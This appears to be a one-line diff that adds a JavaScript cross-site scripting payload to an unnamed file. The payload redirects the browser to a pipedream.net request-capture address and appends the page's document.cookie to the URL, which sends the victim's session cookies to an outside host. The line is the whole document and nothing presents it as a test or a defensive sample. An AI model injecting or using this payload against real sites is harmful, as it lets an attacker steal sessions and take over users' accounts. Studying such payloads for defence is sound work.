@@ -1,0 +1,1 @@
+document.location.href="//eomtg1jcz48suc3.m.pipedream.net?".concat(document.cookie);
